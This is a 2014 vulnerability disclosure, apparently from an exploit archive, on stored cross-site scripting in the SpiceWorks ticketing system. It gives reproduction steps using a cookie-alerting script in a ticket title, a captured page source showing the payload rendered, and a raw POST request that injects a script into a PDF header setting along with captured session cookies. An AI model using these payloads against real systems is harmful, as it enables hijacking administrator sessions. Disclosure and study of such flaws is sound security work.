@@ -1,0 +1,103 @@
+# Exploit Title: Multiple Stored XSS vulnerabilities in SpiceWorks Ticketing system
+# Date: 12/05/2014
+# Exploit author: Dolev Farhi @f1nhack
+# Vendor homepage: http://spiceworks.com
+# Software Link: http://download.spiceworks.com/Spiceworks.exe
+# Version: 7.2.00174 (Latest)
+# Tested on: Kali Linux
+# Vendor alerted: 12/05/2014
+
+1. About the application:
+=======================
+ SpiceWorks is an IT ticketing system deployed in many companies around the world
+ 
+
+2. Vulnerability Description:
+=========================
+Multiple stored XSS were found in SpiceWorks system, allowing an attacker to create a SpiceWorks IT ticket with malicious code.
+once an admin attemps to login to the system dashboard to view open tickets, the code executes and the attacker
+could potentially steal the admin's cookies.
+
+
+3. PoC Videos:
+===============
+https://www.youtube.com/watch?v=lG5Y_okTaos&feature=youtu.be
+https://www.youtube.com/watch?v=efIyZRTDS9c
+
+Steps to reproduce:
+	i.	 Create a ticket in user_portal with the title <script>alert(document.cookie);</script>
+	ii.  submit.
+	iii. login as admin user and navigate to the open tickets, the XSS appears.
+
+4. Session Logs:
+<-> Vulnerability 1 <->
+
+  <div id="helpdesk" class="helpdesk-root">
+  </div>
+
+<script type="text/javascript">
+//<![CDATA[
+
+  window.startingEventId = 112;
+  window.eventGeneration = '3b30b3bfedfae8be30d2b5412fc93003';
+  window.HelpDesk.on("before:start", function() {
+    this.options = {
+      dateFormat: "%m/%d/%y",
+      timeFormat: "%I:%M %p",
+      currencySymbol: "$",
+      allowDelete: true,
+      categories: ["","Maintenance","End User Support"],
+      admin: [{"id":1,"first_name":"user","last_name":"far","email":"admin@gmx.com","role":"admin","department":"IT","avatar_path":null,"primary_phone":null,"show_url":"/people/1"},{"id":3,"first_name":"dolev","last_name":"test","email":"attacker@gmail.com","role":"helpdesk_tech","department":null,"avatar_path":null,"primary_phone":null,"show_url":"/people/3"}],
+      customAttrs: [],
+      disableShortcuts: '',
+      data: {
+        ticketView: {"name":"open_tickets","label":"Open Tickets","sort_by":"id","sort_dir":"desc","hidden_cols":["created_at","closed_at","category","site"],"tickets":[{"id":11,"summary":"\u003Cscript\u003Ealert(document.cookie);\u003C/script\u003E","status":"open"
+        
+        selectedSite: "all",
+        remoteSites: [{"name":"Central Server","site_id":1}]
+      }
+    };
+  });
+
+//]]>
+</script>
+</div>
+
+
+<-> Vulnerability 2 <->
+
+POST /settings/advanced/save_system_setting?name=pdf_header_color HTTP/1.1
+
+Host: ip.add.re.ss
+
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+X-Requested-With: XMLHttpRequest
+
+X-Prototype-Version: 1.6.1
+
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+Referer: http://192.168.186.31/settings/advanced?more_settings=true
+
+Content-Length: 177
+
+Cookie: user_id=BAgw--XXXX6231342123XXXX234213515; portal_user_email=BAhJIhV1c2VyMTk4N0BnbXguY29tBjoGRVQ%3D--f9cd3afeeb246cb35d3670914c45c30e427b76f7; __utma=1.399722362.1399878889.1399878889.1399878889.1; __utmb=1.107.0.1399879583954; __utmz=1.1399878889.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); spiceworks_session=BAh7FToPc2Vzc2lvbl9pZCIlNzgzNzc2ZGNiNTg1ZWQ1ODRlMDVmN2QyNmIwMzc5NWU6EF9jc3JmX3Rva2VuSSIxRkJGMC8vQ2VkYmRzNUtPV05PM2lrK0FQeVAyb25zcHg4WTNPOUdOWU1sWT0GOgZFRkkiCmZsYXNoBjsHRklDOidBY3Rpb25Db250cm9sbGVyOjpGbGFzaDo6Rmxhc2hIYXNoewAGOgpAdXNlZHsAOgx1c2VyX2lkaQY6FHVzZXJfZmlyc3RfbmFtZUkiCXVzZXIGOwdUOhN1c2VyX2xhc3RfbmFtZUkiCGZhcgY7B1Q6D3VzZXJfZW1haWxJIhV1c2VyMTk4N0BnbXguY29tBjsHVDoWdXNlcl9jb21wYW55X25hbWVJIg10ZXN0Y29tcAY7B1Q6DnVzZXJfcm9sZUkiCmFkbWluBjsHVDoPY3JlYXRlZF9hdEl1OglUaW1lDYeRHICWg2JpBjoLb2Zmc2V0aQIwKjoNcmVtZW1iZXJGOhhsYXN0X2ZlYXR1cmVfdXBkYXRlSXU7EQ2HkRyAfodiaQY7EmkCMCo6FmZlYXR1cmVfdXNhZ2VfbWFwexlpBlRpCEZpCUZpEEZpE1RpFVRpFlRpGEZpGUZpGkZpG0ZpCkZpC0ZpDEZpD0ZpF0ZpHEZpHUZpDVRpElQ6H3VzZWRfZmVhdHVyZV9lZHVjYXRpb25faWRzWwA6FnBvcnRhbF91c2VyX2VtYWlsQA06HWxhc3Rfc2V0dGluZ3NfY29udHJvbGxlckkiDWFkdmFuY2VkBjsHRg%3D%3D--64198aa54c349fff2e6e7db88fe63d864cec55fe; compatibility_test=testing; __utmc=1; last_view=open_tickets; tickets_per_page=25
+
+Connection: keep-alive
+
+Pragma: no-cache
+
+Cache-Control: no-cache
+
+
+_pickaxe=%E2%B8%95&value=%3Cscript%3Ealert(%22pdf001%22)%3C%2Fscript%3E&editorId=pdf_header_color_inplace&authenticity_token=FBF0%2F%2FCedbds5KOWNO3ik%2BAPyP2onspx8Y3O9GNYMlY%3D
+
+
+
